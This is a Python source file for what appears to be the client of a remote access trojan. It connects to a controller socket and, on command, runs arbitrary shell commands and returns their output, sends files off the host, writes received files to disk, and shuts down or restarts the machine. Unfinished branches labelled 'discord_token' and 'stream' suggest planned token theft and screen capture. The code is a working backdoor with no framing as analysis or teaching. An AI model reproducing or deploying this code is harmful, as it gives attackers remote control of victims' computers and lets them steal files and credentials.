import socket
import os
import subprocess
# os.popen(cmd).read().encode()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.connect(('127.0.0.1', 1234))

while True:
    cmd = s.recv(10240).decode()

    if cmd == 'discord_token':
        ...
    
    elif cmd == 'shutdown':
        os.system('shutdown /s')
    
    elif cmd == 'restart':
        os.system('shutdown /r')
    
    elif cmd == 'sleep':
        ...
    
    elif cmd == 'put':
        filename = s.recv(10240).decode()
        with open(filename, 'wb') as f:
            data = s.recv(10240000)
            while data:
                f.write(data)
                data = s.recv(10240000)
        print('File received successfully')
    
    elif cmd == 'get':
        filename = s.recv(10240).decode()
        if not os.path.isfile(filename):
            found = 'False'
            s.send(found.encode())
        else:
            s.send('True'.encode())
            with open(filename, 'rb') as f:
                data = f.read()
            s.send(data)
            print('File sent successfully')
    
    elif cmd == 'cmd':
        cmd = s.recv(10240).decode()
        answer = subprocess.getoutput(cmd)
        if not answer or answer == '':
            answer = 'Command executed'
        s.send(answer.encode())
    
    elif cmd == 'stream':
        ...
    
    elif cmd == 'start':
        ...
    
    else:
        break